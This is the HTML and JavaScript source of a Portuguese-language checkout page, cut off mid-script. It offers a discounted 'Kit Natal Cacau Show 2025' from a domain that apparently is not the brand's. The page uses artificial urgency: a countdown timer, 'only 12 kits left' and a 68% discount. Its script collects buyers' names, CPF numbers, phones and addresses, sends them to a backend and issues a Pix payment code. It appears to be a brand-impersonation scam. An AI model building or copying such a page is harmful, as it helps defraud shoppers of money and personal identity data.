<!DOCTYPE html><html lang="pt-BR"><head>
    <meta charset="UTF-8">
    
    <script
  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
  data-utmify-prevent-xcod-sck
  data-utmify-prevent-subids
  async
  defer
></script>
<script>
  window.pixelId = "69268554f90fba4774a33e87";
  var a = document.createElement("script");
  a.setAttribute("async", "");
  a.setAttribute("defer", "");
  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
  document.head.appendChild(a);
</script>
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Checkout - Kit Natal Cacau Show 2025</title>
    <script src="https://cdn.tailwindcss.com/"></script>
    <script src="https://ofertanatalshow.shop/quiz.html/product.html/checkout.html/js/qrcode.min.js"></script>
    <link rel="preconnect" href="https://fonts.googleapis.com/">
    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&amp;display=swap" rel="stylesheet">
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        'chocolate': '#5D3A1A',
                        'gold': '#C9A227',
                        'christmas-red': '#C41E3A',
                        'cream': '#FFF8E7',
                    },
                    fontFamily: {
                        'poppins': ['Poppins', 'sans-serif'],
                    },
                },
            },
        }
    </script>
    <style>
        body { font-family: 'Poppins', sans-serif; }
        .snow-flake {
            position: absolute;
            width: 8px;
            height: 8px;
            background: rgba(255, 255, 255, 0.4);
            border-radius: 50%;
            animation: snowFall linear infinite;
        }
        @keyframes snowFall {
            0% { transform: translateY(-10vh) rotate(0deg); opacity: 1; }
            100% { transform: translateY(100vh) rotate(360deg); opacity: 0.3; }
        }
        @keyframes pulseGlow {
            0%, 100% { box-shadow: 0 0 20px rgba(196, 30, 58, 0.3); }
            50% { box-shadow: 0 0 30px rgba(196, 30, 58, 0.6); }
        }
        .animate-pulse-glow { animation: pulseGlow 2s ease-in-out infinite; }
        .radio-option { cursor: pointer; transition: all 0.2s ease; }
        .radio-option:hover { background-color: rgba(201, 162, 39, 0.05); }
        .radio-option.selected { border-color: #C9A227; background-color: rgba(201, 162, 39, 0.1); }
        input:focus, select:focus {
            outline: none;
            border-color: #C9A227;
            box-shadow: 0 0 0 3px rgba(201, 162, 39, 0.2);
        }
        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        .animate-spin { animation: spin 1s linear infinite; }
    </style>
</head>
<body class="font-poppins">
    <div class="min-h-screen bg-gradient-to-b from-amber-50 to-orange-50 relative overflow-x-hidden">
        <div id="snowfall" class="fixed inset-0 pointer-events-none overflow-hidden z-0"></div>
        <div class="relative z-10 container mx-auto px-3 sm:px-4 py-6 sm:py-8 overflow-x-hidden">
            <div class="max-w-5xl mx-auto">
                <div class="text-center mb-4 sm:mb-6">
                    <img src="https://ofertanatalshow.shop/quiz.html/product.html/checkout.html/images/logo-cacau-show-DRMZ6zUP.png" alt="Cacau Show" class="h-12 sm:h-16 md:h-20 w-auto mx-auto mb-3 md:mb-4 drop-shadow-2xl">
                </div>
                <div id="checkoutSection">
                    <div class="text-center mb-4">
                        <h1 class="text-2xl sm:text-3xl md:text-4xl font-bold text-chocolate mb-2 flex flex-wrap items-center justify-center gap-2 md:gap-3">
                            <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-6 h-6 md:w-8 md:h-8 text-gold"><circle cx="12" cy="12" r="10"></circle><path d="m9 12 2 2 4-4"></path></svg>
                            PARAB√âNS!
                            <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-6 h-6 md:w-8 md:h-8 text-gold"><circle cx="12" cy="12" r="10"></circle><path d="m9 12 2 2 4-4"></path></svg>
                        </h1>
                        <p class="text-sm md:text-base lg:text-lg text-gray-500 px-4">Voc√™ garantiu seu Kit de Natal Cacau Show Exclusivo</p>
                        <div id="locationInfo" class="mt-3 text-sm text-gray-500 items-center justify-center gap-2 hidden">
                            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-4 h-4 text-christmas-red inline"><path d="M20 10c0 6-8 12-8 12s-8-6-8-12a8 8 0 0 1 16 0Z"></path><circle cx="12" cy="10" r="3"></circle></svg>
                            <span>Entregamos em <span id="cityName">sua cidade</span></span>
                        </div>
                    </div>
                    <div class="bg-white rounded-xl p-3 border border-gray-200 mb-6 shadow-sm">
                        <div class="flex items-center justify-center gap-2 text-sm">
                            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-4 h-4 text-gray-500"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
                            <span class="text-gray-500">Oferta expira em:</span>
                            <span id="timer" class="font-mono font-bold text-christmas-red">30:00</span>
                        </div>
                    </div>
                    <div class="bg-gradient-to-br from-gold/10 to-christmas-red/10 rounded-2xl p-4 sm:p-6 mb-8 shadow-lg border-2 border-gold/20">
                        <h3 class="text-lg font-bold text-chocolate mb-3 flex items-center gap-2">
                            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-5 h-5 text-christmas-red"><path d="M21 8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16Z"></path><path d="m3.3 7 8.7 5 8.7-5"></path><path d="M12 22V12"></path></svg>
                            Por que garantir agora?
                        </h3>
                        <ul class="space-y-2 text-sm text-gray-600">
                            <li class="flex items-start gap-2"><span class="text-christmas-red font-bold">‚úì</span><span>Apenas 12 kits restantes com esse desconto</span></li>
                            <li class="flex items-start gap-2"><span class="text-christmas-red font-bold">‚úì</span><span>68% de desconto por tempo limitado</span></li>
                            <li class="flex items-start gap-2"><span class="text-christmas-red font-bold">‚úì</span><span>Edi√ß√£o especial de Natal 2025</span></li>
                            <li class="flex items-start gap-2"><span class="text-christmas-red font-bold">‚úì</span><span>Entrega garantida antes do Natal</span></li>
                        </ul>
                    </div>
                    <div class="grid grid-cols-1 md:grid-cols-3 gap-4 sm:gap-6">
                        <div class="md:col-span-2 space-y-4 sm:space-y-6">
                            <div class="bg-white rounded-2xl p-4 sm:p-6 shadow-xl border-2 border-gold/20">
                                <h2 class="text-lg sm:text-xl md:text-2xl font-bold text-chocolate mb-4 sm:mb-6 flex items-center gap-2">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-5 h-5 sm:w-6 sm:h-6 text-christmas-red"><path d="M21 8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16Z"></path><path d="m3.3 7 8.7 5 8.7-5"></path><path d="M12 22V12"></path></svg>
                                    Dados de Entrega
                                </h2>
                                <form id="checkoutForm" class="space-y-3 sm:space-y-4">
                                    <div class="space-y-1.5 sm:space-y-2">
                                        <label for="name" class="block text-xs sm:text-sm font-medium text-gray-700">Nome Completo *</label>
                                        <input type="text" id="name" placeholder="Seu nome completo" required="" class="w-full h-10 sm:h-11 px-3 text-sm sm:text-base border-2 border-gray-200 rounded-lg">
                                    </div>
                                    <div class="space-y-1.5 sm:space-y-2">
                                        <label for="email" class="block text-xs sm:text-sm font-medium text-gray-700">E-mail *</label>
                                        <input type="email" id="email" placeholder="seu@email.com" required="" class="w-full h-10 sm:h-11 px-3 text-sm sm:text-base border-2 border-gray-200 rounded-lg">
                                    </div>
                                    <div class="space-y-1.5 sm:space-y-2">
                                        <label for="cpf" class="block text-xs sm:text-sm font-medium text-gray-700">CPF *</label>
                                        <input type="text" id="cpf" placeholder="000.000.000-00" required="" maxlength="14" class="w-full h-10 sm:h-11 px-3 text-sm sm:text-base border-2 border-gray-200 rounded-lg">
                                    </div>
                                    <div class="space-y-1.5 sm:space-y-2">
                                        <label for="phone" class="block text-xs sm:text-sm font-medium text-gray-700">WhatsApp *</label>
                                        <input type="tel" id="phone" placeholder="(00) 00000-0000" required="" maxlength="15" class="w-full h-10 sm:h-11 px-3 text-sm sm:text-base border-2 border-gray-200 rounded-lg">
                                    </div>
                                    <div class="grid grid-cols-1 sm:grid-cols-2 gap-3 sm:gap-4">
                                        <div class="space-y-1.5 sm:space-y-2 sm:col-span-2">
                                            <label for="cep" class="block text-xs sm:text-sm font-medium text-gray-700">CEP *</label>
                                            <div class="relative">
                                                <input type="text" id="cep" placeholder="00000-000" required="" maxlength="9" class="w-full h-10 sm:h-11 px-3 text-sm sm:text-base border-2 border-gray-200 rounded-lg">
                                                <div id="cepLoading" class="absolute right-3 top-1/2 -translate-y-1/2 hidden">
                                                    <svg class="w-4 h-4 animate-spin text-gray-400" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="space-y-1.5 sm:space-y-2 sm:col-span-2">
                                            <label for="street" class="block text-xs sm:text-sm font-medium text-gray-700">Rua *</label>
                                            <input type="text" id="street" placeholder="Nome da rua" required="" class="w-full h-10 sm:h-11 px-3 text-sm sm:text-base border-2 border-gray-200 rounded-lg">
                                        </div>
                                        <div class="space-y-1.5 sm:space-y-2">
                                            <label for="number" class="block text-xs sm:text-sm font-medium text-gray-700">N√∫mero *</label>
                                            <input type="text" id="number" placeholder="N¬∫" required="" class="w-full h-10 sm:h-11 px-3 text-sm sm:text-base border-2 border-gray-200 rounded-lg">
                                        </div>
                                        <div class="space-y-1.5 sm:space-y-2">
                                            <label for="complement" class="block text-xs sm:text-sm font-medium text-gray-700">Complemento</label>
                                            <input type="text" id="complement" placeholder="Apto, bloco..." class="w-full h-10 sm:h-11 px-3 text-sm sm:text-base border-2 border-gray-200 rounded-lg">
                                        </div>
                                        <div class="space-y-1.5 sm:space-y-2">
                                            <label for="neighborhood" class="block text-xs sm:text-sm font-medium text-gray-700">Bairro *</label>
                                            <input type="text" id="neighborhood" placeholder="Bairro" required="" class="w-full h-10 sm:h-11 px-3 text-sm sm:text-base border-2 border-gray-200 rounded-lg">
                                        </div>
                                        <div class="space-y-1.5 sm:space-y-2">
                                            <label for="city" class="block text-xs sm:text-sm font-medium text-gray-700">Cidade *</label>
                                            <input type="text" id="city" placeholder="Cidade" required="" class="w-full h-10 sm:h-11 px-3 text-sm sm:text-base border-2 border-gray-200 rounded-lg">
                                        </div>
                                        <div class="space-y-1.5 sm:space-y-2">
                                            <label for="state" class="block text-xs sm:text-sm font-medium text-gray-700">Estado *</label>
                                            <input type="text" id="state" placeholder="UF" required="" maxlength="2" class="w-full h-10 sm:h-11 px-3 text-sm sm:text-base border-2 border-gray-200 rounded-lg uppercase">
                                        </div>
                                    </div>
                                    <div class="space-y-2 pt-2">
                                        <label class="block text-xs sm:text-sm font-medium text-gray-700">Tipo de Entrega *</label>
                                        <div id="normalShipping" class="radio-option selected flex items-center space-x-3 border-2 rounded-lg p-3" onclick="selectShipping('normal')">
                                            <div class="w-4 h-4 rounded-full border-2 border-gold flex items-center justify-center">
                                                <div class="w-2 h-2 rounded-full bg-gold"></div>
                                            </div>
                                            <div class="flex-1">
                                                <div class="flex items-center justify-between mb-1">
                                                    <div class="flex items-center gap-2">
                                                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-4 h-4 text-gray-500"><path d="M10 17h4V5H2v12h3m15 0h2v-3.34a4 4 0 0 0-1.17-2.83L19 9h-5m0 8h1"></path><circle cx="7.5" cy="17.5" r="2.5"></circle><circle cx="17.5" cy="17.5" r="2.5"></circle></svg>
                                                        <span class="font-medium text-sm text-gray-700">Entrega Normal</span>
                                                    </div>
                                                    <span class="text-sm font-semibold text-green-600">GR√ÅTIS</span>
                                                </div>
                                                <p class="text-xs text-gray-500 pl-6">15 a 20 dias √∫teis</p>
                                            </div>
                                        </div>
                                        <div id="fastShipping" class="radio-option flex items-center space-x-3 border-2 rounded-lg p-3" onclick="selectShipping('fast')">
                                            <div class="w-4 h-4 rounded-full border-2 border-gray-300 flex items-center justify-center">
                                                <div class="w-2 h-2 rounded-full bg-transparent"></div>
                                            </div>
                                            <div class="flex-1">
                                                <div class="flex items-center justify-between mb-1">
                                                    <div class="flex items-center gap-2">
                                                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-4 h-4 text-christmas-red"><path d="M10 17h4V5H2v12h3m15 0h2v-3.34a4 4 0 0 0-1.17-2.83L19 9h-5m0 8h1"></path><circle cx="7.5" cy="17.5" r="2.5"></circle><circle cx="17.5" cy="17.5" r="2.5"></circle></svg>
                                                        <span class="font-medium text-sm text-gray-700">Entrega R√°pida</span>
                                                    </div>
                                                    <span class="text-sm font-semibold text-gray-700">R$ 14,90</span>
                                                </div>
                                                <p class="text-xs text-gray-500 pl-6">5 a 7 dias √∫teis</p>
                                            </div>
                                        </div>
                                    </div>
                                    <div id="errorMessage" class="hidden bg-red-50 border border-red-200 rounded-lg p-3 text-sm text-red-700">
                                        <span id="errorText"></span>
                                    </div>
                                    <button type="submit" id="submitBtn" class="w-full bg-gradient-to-r from-christmas-red to-red-700 hover:from-red-700 hover:to-christmas-red text-white text-sm sm:text-base md:text-lg py-4 sm:py-5 md:py-6 font-bold shadow-lg mt-4 sm:mt-6 rounded-xl transition-all animate-pulse-glow flex items-center justify-center gap-2">
                                        <span id="submitBtnText">üéÅ FINALIZAR PEDIDO COM PIX</span>
                                        <svg id="submitBtnSpinner" class="hidden w-5 h-5 animate-spin" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg>
                                    </button>
                                </form>
                                <div class="mt-4 sm:mt-6 flex items-center justify-center gap-1.5 sm:gap-2 text-xs sm:text-sm text-gray-500">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-3.5 h-3.5 sm:w-4 sm:h-4"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10"></path></svg>
                                    <span>Compra 100% segura e protegida</span>
                                </div>
                            </div>
                        </div>
                        <div class="space-y-4 sm:space-y-6">
                            <div class="bg-white rounded-2xl p-4 sm:p-6 shadow-xl border-2 border-gold/20 md:sticky md:top-4">
                                <h3 class="text-base sm:text-lg md:text-xl font-bold text-chocolate mb-3 sm:mb-4">Resumo do Pedido</h3>
                                <div class="bg-gradient-to-br from-white/50 to-cream/30 rounded-lg p-2 sm:p-3 mb-3 sm:mb-4">
                                    <img src="https://ofertanatalshow.shop/quiz.html/product.html/checkout.html/images/produto-natal-CeKtcqZK.png" alt="Produto" class="w-full mb-2 sm:mb-3 drop-shadow-2xl">
                                    <p class="font-semibold text-chocolate text-xs sm:text-sm">Kit Especial de Natal Cacau Show 2025</p>
                                </div>
                                <div class="space-y-2 sm:space-y-3 mb-4 sm:mb-6">
                                    <div class="flex justify-between text-xs sm:text-sm">
                                        <span class="text-gray-500">Subtotal:</span>
                                        <span class="line-through text-gray-400">R$ 260,00</span>
                                    </div>
                                    <div class="flex justify-between text-xs sm:text-sm">
                                        <span class="text-christmas-red font-semibold">Desconto (68%):</span>
                                        <span class="text-christmas-red font-semibold">- R$ 176,80</span>
                                    </div>
                                    <div class="flex justify-between text-xs sm:text-sm">
                                        <span class="text-gray-500">Produto:</span>
                                        <span class="font-semibold">R$ 63,20</span>
                                    </div>
                                    <div class="flex justify-between text-xs sm:text-sm">
                                        <span class="text-gray-500">Frete:</span>
                                        <span id="shippingPrice" class="text-green-600 font-semibold">GR√ÅTIS</span>
                                    </div>
                                    <div class="border-t-2 border-gold/30 pt-2 sm:pt-3">
                                        <div class="flex justify-between items-center">
                                            <span class="font-bold text-chocolate text-base sm:text-lg">Total:</span>
                                            <span id="totalPrice" class="text-xl sm:text-2xl md:text-3xl font-bold text-christmas-red">R$ 63,20</span>
                                        </div>
                                    </div>
                                </div>
                                <div class="bg-gold/10 rounded-lg p-2.5 sm:p-3 text-center border border-gold/30">
                                    <p class="text-xs sm:text-sm font-medium text-chocolate">üí≥ Pagamento via PIX</p>
                                    <p class="text-[10px] sm:text-xs text-gray-500 mt-0.5 sm:mt-1">Aprova√ß√£o instant√¢nea</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div id="pixSection" class="hidden">
                    <div class="max-w-2xl mx-auto">
                        <div class="bg-white rounded-2xl p-4 sm:p-6 shadow-xl border-2 border-gold/20">
                            <div class="text-center space-y-2 mb-6">
                                <h2 class="text-xl sm:text-2xl font-bold text-chocolate">Pagamento via PIX</h2>
                                <p class="text-gray-500 text-sm">Escaneie o QR Code ou copie o c√≥digo para pagar</p>
                            </div>
                            <div class="bg-white p-4 sm:p-6 rounded-lg border-2 border-gold/20 mb-6">
                                <div class="flex justify-center mb-4">
                                    <div id="qrCodeContainer" class="w-48 h-48 sm:w-64 sm:h-64 border-2 border-gray-100 rounded-lg flex items-center justify-center bg-white">
                                        <div id="qrCodeImage"></div>
                                    </div>
                                </div>
                                <div class="bg-red-50 border border-red-200 rounded-lg p-3 mb-4">
                                    <div class="flex items-center justify-center gap-2 text-sm">
                                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-4 h-4 text-red-500 animate-pulse"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
                                        <span class="text-red-700">O c√≥digo expira em:</span>
                                        <span id="pixTimer" class="font-mono font-bold text-red-600">15:00</span>
                                    </div>
                                </div>
                                <div class="space-y-3">
                                    <div class="p-3 bg-gray-50 rounded-lg break-all text-xs sm:text-sm text-gray-600 font-mono" id="pixCodeDisplay">
                                        Carregando c√≥digo PIX...
                                    </div>
                                    <button onclick="copyPixCode()" id="copyBtn" class="w-full py-3 border-2 border-gold text-chocolate rounded-lg font-medium text-sm hover:bg-gold/10 transition-colors flex items-center justify-center gap-2">
                                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-4 h-4"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg>
                                        <span id="copyText">Copiar C√≥digo PIX</span>
                                    </button>
                                </div>
                            </div>
                            <div class="text-center space-y-4 mb-6">
                                <div class="text-xl font-bold text-christmas-red" id="pixAmountDisplay">R$ 63,20</div>
                                <div id="paymentStatus" class="bg-yellow-50 border border-yellow-200 rounded-lg p-3">
                                    <div class="flex items-center justify-center gap-2">
                                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-4 h-4 text-yellow-600 animate-pulse"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
                                        <span class="text-sm text-yellow-700 font-medium">Aguardando pagamento...</span>
                                    </div>
                                </div>
                                <button onclick="checkPaymentStatus()" id="confirmBtn" class="w-full bg-christmas-red hover:bg-red-700 text-white py-4 rounded-xl font-bold transition-colors flex items-center justify-center gap-2">
                                    <span>Verificar pagamento</span>
                                </button>
                                <button onclick="cancelPixPayment()" class="w-full py-3 text-gray-500 hover:text-gray-700 font-medium transition-colors">
                                    Cancelar e voltar
                                </button>
                            </div>
                            <div class="bg-blue-50 border border-blue-200 rounded-lg p-4 text-sm">
                                <p class="font-semibold text-blue-900 mb-2">Como pagar:</p>
                                <ol class="list-decimal list-inside space-y-1 text-blue-800">
                                    <li>Abra o app do seu banco</li>
                                    <li>Escolha pagar com PIX</li>
                                    <li>Escaneie o QR Code ou cole o c√≥digo</li>
                                    <li>Confirme o pagamento</li>
                                </ol>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script>
        const API_URL = '/api';
        const productPrice = 6320;
        const fastShippingPrice = 1490;

        let shippingType = 'normal';
        let offerTimeLeft = 30 * 60;
        let pixTimeLeft = 15 * 60;
        let pixTimerInterval = null;
        let offerTimerInterval = null;
        let statusCheckInterval = null;
        let currentTransactionId = null;
        let currentPixCode = '';
        let qrCodeInstance = null;
        let currentCustomerData = null;

        const utmParams = {
            src: null,
            sck: null,
            utm_source: null,
            utm_campaign: null,
            utm_medium: null,
            utm_content: null,
            utm_term: null
        };

        function captureUtmParams() {
            const urlParams = new URLSearchParams(window.location.search);
            utmParams.src = urlParams.get('src') || null;
            utmParams.sck = urlParams.get('sck') || null;
            utmParams.utm_source = urlParams.get('utm_source') || null;
            utmParams.utm_campaign = urlParams.get('utm_campaign') || null;
            utmParams.utm_medium = urlParams.get('utm_medium') || null;
            utmParams.utm_content = urlParams.get('utm_content') || null;
            utmParams.utm_term = urlParams.get('utm_term') || null;
            console.log('UTM Params capturados:', utmParams);
        }

        function phoneMask(value) {
            return value
                .replace(/\D/g, '')
                .replace(/^(\d{2})(\d)/g, '($1) $2')
                .replace(/(\d{5})(\d)/, '$1-$2')
                .slice(0, 15);
        }

        function cepMask(value) {
            return value
                .replace(/\D/g, '')
                .replace(/^(\d{5})(\d)/, '$1-$2')
                .slice(0, 9);
        }

        function cpfMask(value) {
            return value
                .replace(/\D/g, '')
                .replace(/(\d{3})(\d)/, '$1.$2')
                .replace(/(\d{3})(\d)/, '$1.$2')
                .replace(/(\d{3})(\d{1,2})$/, '$1-$2')
                .slice(0, 14);
        }

        async function fetchAddress(cep) {
            const cleanCep = cep.replace(/\D/g, '');
            if (cleanCep.length !== 8) return;
            document.getElementById('cepLoading').classList.remove('hidden');
            try {
                const response = await fetch(`https://viacep.com.br/ws/${cleanCep}/json/`);
                const data = await response.json();
                if (data.erro) {
                    showError('CEP n√£o encontrado');
                    return;
                }
                document.getElementById('street').value = data.logradouro || '';
                document.getElementById('neighborhood').value = data.bairro || '';
                document.getElementById('city').value = data.localidade || '';
                document.getElementById('state').value = data.uf || '';
            } catch (error) {
                console.error('Erro ao buscar CEP:', error);
            } finally {
                document.getElementById('cepLoading').classList.add('hidden');
            }
        }

        function selectShipping(type) {
            shippingType = type;
            const normalEl = document.getElementById('normalShipping');
            const fastEl = document.getElementById('fastShipping');
            if (type === 'normal') {
                normalEl.classList.add('selected');
                normalEl.querySelector('.w-4.h-4 > div').classList.remove('bg-transparent');
                normalEl.querySelector('.w-4.h-4 > div').classList.add('bg-gold');
                normalEl.querySelector('.w-4.h-4').classList.remove('border-gray-300');
                normalEl.querySelector('.w-4.h-4').classList.add('border-gold');
                fastEl.classList.remove('selected');
                fastEl.querySelector('.w-4.h-4 > div').classList.add('bg-transparent');
                fastEl.querySelector('.w-4.h-4 > div').classList.remove('bg-gold');
                fastEl.querySelector('.w-4.h-4').classList.add('border-gray-300');
                fastEl.querySelector('.w-4.h-4').classList.remove('border-gold');
            } else {
                fastEl.classList.add('selected');
                fastEl.querySelector('.w-4.h-4 > div').classList.remove('bg-transparent');
                fastEl.querySelector('.w-4.h-4 > div').classList.add('bg-gold');
                fastEl.querySelector('.w-4.h-4').classList.remove('border-gray-300');
                fastEl.querySelector('.w-4.h-4').classList.add('border-gold');
                normalEl.classList.remove('selected');
                normalEl.querySelector('.w-4.h-4 > div').classList.add('bg-transparent');
                normalEl.querySelector('.w-4.h-4 > div').classList.remove('bg-gold');
                normalEl.querySelector('.w-4.h-4').classList.add('border-gray-300');
                normalEl.querySelector('.w-4.h-4').classList.remove('border-gold');
            }
            updatePrices();
        }

        function updatePrices() {
            const shippingCost = shippingType === 'fast' ? fastShippingPrice : 0;
            const total = productPrice + shippingCost;
            document.getElementById('shippingPrice').textContent = shippingCost === 0 ? 'GR√ÅTIS' : `R$ ${(shippingCost / 100).toFixed(2)}`;
            document.getElementById('shippingPrice').className = shippingCost === 0 ? 'text-green-600 font-semibold' : 'font-semibold';
            document.getElementById('totalPrice').textContent = `R$ ${(total / 100).toFixed(2)}`;
        }

        function showError(message) {
            const errorDiv = document.getElementById('errorMessage');
            const errorText = document.getElementById('errorText');
            errorText.textContent = message;
            errorDiv.classList.remove('hidden');
        }

        function hideError() {
            document.getElementById('errorMessage').classList.add('hidden');
        }

        function updateOfferTimer() {
            const minutes = Math.floor(offerTimeLeft / 60);
            const seconds = offerTimeLeft % 60;
            document.getElementById('timer').textContent = String(minutes).padStart(2, '0') + ':' + String(seconds).padStart(2, '0');
            if (offerTimeLeft > 0) {
                offerTimeLeft--;
            }
        }

        function updatePixTimer() {
            const minutes = Math.floor(pixTimeLeft / 60);
            const seconds = pixTimeLeft % 60;
            document.getElementById('pixTimer').textContent = String(minutes).padStart(2, '0') + ':' + String(seconds).padStart(2, '0');
            if (pixTimeLeft > 0) {
                pixTimeLeft--;
            } else {
                clearInterval(pixTimerInterval);
                if (statusCheckInterval) clearInterval(statusCheckInterval);
                alert('O c√≥digo PIX expirou. Por favor, gere um novo c√≥digo.');
                cancelPixPayment();
            }
        }

        async function createPixTransaction(formData) {
            const payload = {
                name: formData.name,
                email: formData.email,
                cpf: formData.cpf,
                phone: formData.phone,
                cep: formData.cep,
                street: formData.street,
                number: formData.number,
                complement: formData.complement,
                neighborhood: formData.neighborhood,
                city: formData.city,
                state: formData.state,
                shipping_type: shippingType,
                src: utmParams.src,
                sck: utmParams.sck,
                utm_source: utmParams.utm_source,
                utm_campaign: utmParams.utm_campaign,
                utm_medium: utmParams.utm_medium,
                utm_content: utmParams.utm_content,
                utm_term: utmParams.utm_term
            };
            console.log('Enviando para API:', payload);
            const response = await fetch(API_URL + '/create-pix', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            });
            const data = await response.json();
            console.log('Resposta da API:', data);
            return data;
        }

        async function checkPaymentStatus() {
            if (!currentTransactionId) {
                alert('Nenhuma transa√ß√£o encontrada');
                return;
            }
            const confirmBtn = document.getElementById('confirmBtn');
            confirmBtn.innerHTML = '<svg class="w-5 h-5 animate-spin" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg><span>Verificando...</span>';
            confirmBtn.disabled = true;
            try {
                const response = await fetch(API_URL + '/check-status', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        transaction_id: currentTransactionId
                    })
                });
                const data = await response.json();
                console.log('Status da transa√ß√£o:', data);
                if (data.success && data.data && data.data.status === 'paid') {
                    showPaymentSuccess();
                } else {
                    confirmBtn.innerHTML = '<span>Verificar pagamento</span>';
                    confirmBtn.disabled = false;
                    const statusDiv = document.getElementById('paymentStatus');
                    statusDiv.innerHTML = '<div class="flex items-center justify-center gap-2"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-4 h-4 text-yellow-600 animate-pulse"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg><span class="text-sm text-yellow-700 font-medium">Pagamento ainda n√£o identificado. Aguarde alguns instantes...</span></div>';
                }
            } catch (error) {
                console.error('Erro ao verificar status:', error);
                confirmBtn.innerHTML = '<span>Verificar pagamento</span>';
                confirmBtn.disabled = false;
            }
        }

        function showPaymentSuccess() {
            if (statusCheckInterval) clearInterval(statusCheckInterval);
            if (pixTimerInterval) clearInterval(pixTimerInterval);
            const statusDiv = document.getElementById('paymentStatus');
            const confirmBtn = document.getElementById('confirmBtn');
